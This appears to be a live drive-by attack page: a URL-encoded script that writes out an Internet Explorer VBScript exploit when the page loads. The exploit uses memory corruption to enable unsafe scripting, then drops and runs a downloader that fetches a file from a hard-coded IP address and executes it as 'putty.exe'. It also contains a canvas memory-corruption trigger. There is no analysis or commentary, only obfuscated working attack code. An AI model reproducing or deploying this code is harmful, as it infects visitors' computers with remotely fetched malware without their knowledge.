
<script>
<!--
document.write(unescape("%3Chtml%3E%0A%3Chead%3E%0A%3Cmeta%20http-equiv%3D%22x-ua-compatible%22%20content%3D%22IE%3D10%22%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%20%20%20%20%3Cscript%20type%3D%22text/vbscript%22%3E%0A%20%20%20%20%20%20%20%20Dim%20aw%0A%20%20%20%20%20%20%20%20Dim%20plunge%2832%29%0A%20%20%20%20%20%20%20%20Dim%20y%2832%29%0A%20%20%20%20%20%20%20%20prefix%20%3D%20%22%25u4141%25u4141%22%0A%20%20%20%20%20%20%20%20d%20%3D%20prefix%20%26%20%22%25u0016%25u4141%25u4141%25u4141%25u4242%25u4242%22%0A%20%20%20%20%20%20%20%20b%20%3D%20String%2864000%2C%20%22D%22%29%0A%20%20%20%20%20%20%20%20c%20%3D%20d%20%26%20b%0A%20%20%20%20%20%20%20%20x%20%3D%20UnEscape%28c%29%0A%0A%20%20%20%20%20%20%20%20Class%20ArrayWrapper%0A%20%20%20%20%20%20%20%20%20%20%20%20Dim%20A%28%29%0A%20%20%20%20%20%20%20%20%20%20%20%20Private%20Sub%20Class_Initialize%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%27%202x2000%20elements%20x%2016%20bytes%20/%20element%20%3D%2064000%20bytes%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20ReDim%20Preserve%20A%281%2C%202000%29%0A%20%20%20%20%20%20%20%20%20%20%20%20End%20Sub%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20Public%20Sub%20Resize%28%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20ReDim%20Preserve%20A%281%2C%201%29%0A%20%20%20%20%20%20%20%20%20%20%20%20End%20Sub%0A%20%20%20%20%20%20%20%20End%20Class%0A%0A%20%20%20%20%20%20%20%20Class%20Dummy%0A%20%20%20%20%20%20%20%20End%20Class%0A%0A%20%20%20%20%20%20%20%20Function%20getAddr%20%28arg1%2C%20s%29%0A%20%20%20%20%20%20%20%20%20%20%20%20aw%20%3D%20Null%0A%20%20%20%20%20%20%20%20%20%20%20%20Set%20aw%20%3D%20New%20ArrayWrapper%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20For%20i%20%3D%200%20To%2032%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Set%20plunge%28i%29%20%3D%20s%0A%20%20%20%20%20%20%20%20%20%20%20%20Next%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20Set%20aw.A%28arg1%2C%202%29%20%3D%20s%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20Dim%20addr%0A%20%20%20%20%20%20%20%20%20%20%20%20Dim%20i%0A%20%20%20%20%20%20%20%20%20%20%20%20For%20i%20%3D%200%20To%2031%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20If%20Asc%28Mid%28y%28i%29%2C%203%2C%201%29%29%20%3D%20VarType%28s%29%20Then%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20addr%20%3D%20strToInt%28Mid%28y%28i%29%2C%203%20+%204%2C%202%29%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20End%20If%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20y%28i%29%20%3D%20Null%0A%20%20%20%20%20%20%20%20%20%20%20%20Next%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20If%20addr%20%3D%20Null%20Then%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20document.location.href%20%3D%20document.location.href%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Return%0A%20%20%20%20%20%20%20%20%20%20%20%20End%20If%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20getAddr%20%3D%20addr%0A%20%20%20%20%20%20%20%20End%20Function%0A%0A%20%20%20%20%20%20%20%20Function%20leakMem%20%28arg1%2C%20addr%29%0A%20%20%20%20%20%20%20%20%20%20%20%20d%20%3D%20prefix%20%26%20%22%25u0008%25u4141%25u4141%25u4141%22%0A%20%20%20%20%20%20%20%20%20%20%20%20c%20%3D%20d%20%26%20intToStr%28addr%29%20%26%20b%0A%20%20%20%20%20%20%20%20%20%20%20%20x%20%3D%20UnEscape%28c%29%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20aw%20%3D%20Null%0A%20%20%20%20%20%20%20%20%20%20%20%20Set%20aw%20%3D%20New%20ArrayWrapper%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20Dim%20o%0A%20%20%20%20%20%20%20%20%20%20%20%20o%20%3D%20aw.A%28arg1%2C%202%29%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20leakMem%20%3D%20o%0A%20%20%20%20%20%20%20%20End%20Function%0A%0A%20%20%20%20%20%20%20%20Sub%20overwrite%20%28arg1%2C%20addr%29%0A%20%20%20%20%20%20%20%20%20%20%20%20d%20%3D%20prefix%20%26%20%22%25u400C%25u0000%25u0000%25u0000%22%0A%20%20%20%20%20%20%20%20%20%20%20%20c%20%3D%20d%20%26%20intToStr%28addr%29%20%26%20b%0A%20%20%20%20%20%20%20%20%20%20%20%20x%20%3D%20UnEscape%28c%29%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20aw%20%3D%20Null%0A%20%20%20%20%20%20%20%20%20%20%20%20Set%20aw%20%3D%20New%20ArrayWrapper%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%20Single%20has%20vartype%20of%200x04%0A%20%20%20%20%20%20%20%20%20%20%20%20aw.A%28arg1%2C%202%29%20%3D%20CSng%280%29%0A%20%20%20%20%20%20%20%20End%20Sub%0A%0A%20%20%20%20%20%20%20%20Function%20exploit%20%28arg1%29%0A%20%20%20%20%20%20%20%20%20%20%20%20Dim%20addr%0A%20%20%20%20%20%20%20%20%20%20%20%20Dim%20csession%0A%20%20%20%20%20%20%20%20%20%20%20%20Dim%20olescript%0A%20%20%20%20%20%20%20%20%20%20%20%20Dim%20mem%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%20Create%20a%20vbscript%20class%20instance%0A%20%20%20%20%20%20%20%20%20%20%20%20Set%20dm%20%3D%20New%20Dummy%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%20Get%20address%20of%20the%20class%20instance%0A%20%20%20%20%20%20%20%20%20%20%20%20addr%20%3D%20getAddr%28arg1%2C%20dm%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%20Leak%20CSession%20address%20from%20class%20instance%0A%20%20%20%20%20%20%20%20%20%20%20%20mem%20%3D%20leakMem%28arg1%2C%20addr%20+%208%29%0A%20%20%20%20%20%20%20%20%20%20%20%20csession%20%3D%20strToInt%28Mid%28mem%2C%203%2C%202%29%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%20Leak%20COleScript%20address%20from%20CSession%20instance%0A%20%20%20%20%20%20%20%20%20%20%20%20mem%20%3D%20leakMem%28arg1%2C%20csession%20+%204%29%0A%20%20%20%20%20%20%20%20%20%20%20%20olescript%20%3D%20strToInt%28Mid%28mem%2C%201%2C%202%29%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%20Overwrite%20SafetyOption%20in%20COleScript%20%28e.g.%20god%20mode%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%20e.g.%20changes%20it%20to%200x04%20which%20is%20not%20in%200x0B%20mask%0A%20%20%20%20%20%20%20%20%20%20%20%20overwrite%20arg1%2C%20olescript%20+%20%26H174%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%20function%20runmumaa%28%29%20%0AOn%20Error%20Resume%20Next%0ASet%20objWsh%20%3D%20CreateObject%28%22Wscript.Shell%22%29%0AobjWsh.run%20%22cmd.exe%20/c%20echo%20%3E%3EC%3A%5CWindows%5CTemp%5Ctext.vbs%20Set%20xPost%3DcreateObject%28%22%22Microsoft.XMLHTTP%22%22%29%20%26%20echo%20%3E%3EC%3A%5CWindows%5CTemp%5Ctext.vbs%20xPost.Open%20%22%22GET%22%22%2C%22%22http%3A//58.234.207.76%3A81/1.rar%22%22%2C0%20%26%20echo%20%3E%3EC%3A%5CWindows%5CTemp%5Ctext.vbs%20xPost.Send%28%29%20%26%20echo%20%3E%3EC%3A%5CWindows%5CTemp%5Ctext.vbs%20set%20sGet%3DcreateObject%28%22%22ADODB.Stream%22%22%29%20%26%20echo%20%3E%3EC%3A%5CWindows%5CTemp%5Ctext.vbs%20sGet.Mode%3D3%20%26%20echo%20%3E%3EC%3A%5CWindows%5CTemp%5Ctext.vbs%20sGet.Type%3D1%20%26%20echo%20%3E%3EC%3A%5CWindows%5CTemp%5Ctext.vbs%20sGet.Open%28%29%20%26%20echo%20%3E%3EC%3A%5CWindows%5CTemp%5Ctext.vbs%20sGet.Write%20xPost.ResponseBody%20%26%20echo%20%3E%3EC%3A%5CWindows%5CTemp%5Ctext.vbs%20sGet.SaveToFile%20%22%22C%3A%5CWindows%5CTemp%5Cputty.exe%22%22%2C2%22%2C0%0AobjWsh.run%20%22cscript.exe%20C%3A%5CWindows%5CTemp%5Ctext.vbs%22%2C0%2Ctrue%0Awscript.sleep%2010000%0AobjWsh.run%20%22C%3A%5CWindows%5CTemp%5Cputty.exe%22%0Adocument.write%28Err.Description%29%0A%20%20%20%20%20%20%20%20End%20Function%0A%0A%20%20%20%20%20%20%20%20Function%20triggerBug%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%20Resize%20array%20we%20are%20currently%20indexing%0A%20%20%20%20%20%20%20%20%20%20%20%20aw.Resize%28%29%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%20Overlap%20freed%20array%20area%20with%20our%20exploit%20string%0A%20%20%20%20%20%20%20%20%20%20%20%20Dim%20i%0A%20%20%20%20%20%20%20%20%20%20%20%20For%20i%20%3D%200%20To%2032%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%27%2024000x2%20+%206%20%3D%2048006%20bytes%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20y%28i%29%20%3D%20Mid%28x%2C%201%2C%2024000%29%0A%20%20%20%20%20%20%20%20%20%20%20%20Next%0A%20%20%20%20%20%20%20%20End%20Function%0A%20%20%20%20%3C/script%3E%0A%0A%20%20%20%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20%20%20%20%20%20%20%20function%20strToInt%28s%29%0A%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20s.charCodeAt%280%29%20%7C%20%28s.charCodeAt%281%29%20%3C%3C%2016%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20function%20intToStr%28x%29%0A%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20String.fromCharCode%28x%20%26%200xffff%29%20+%20String.fromCharCode%28x%20%3E%3E%2016%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20var%20o%3B%0A%20%20%20%20%20%20%20%20o%20%3D%20%7B%22valueOf%22%3A%20function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20triggerBug%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%201%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%7D%3B%0A%20%20%20%20%20%20%20%20setTimeout%28function%28%29%20%7Bexploit%28o%29%3B%7D%2C%2050%29%3B%0A%20%20%20%20%3C/script%3E%0A%3Cscript%3E%0A%20%20%20%20%20%20window.onload%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20var%20oCanvas%20%3D%20document.createElement%28%22canvas%22%29%3B%0A%20%20%20%20%20%20%20%20var%20oContext2d%20%3D%20oCanvas.getContext%28%222d%22%29%3B%0A%20%20%20%20%20%20%20%20this.oImageData%20%3D%20oContext2d.createImageData%280x17001337%2C1%29%3B%0A%20%20%20%20%20%20%20%20function%20addressToIndex%28iAddress%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20return%20iAddress%20+%20%28iAddress%20%3C%200x7fff0000%20%3F%20+0x80010000%20%3A%20-0x7fff0000%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20this.oImageData.data%5BaddressToIndex%280xDEADBEEF%29%5D%20%3D%200x41%3B%0A%20%20%20%20%20%20%7D%3B%0A%20%3C/script%3E%0A%3C/body%3E%0A%3C/html%3E"));
//-->
</script>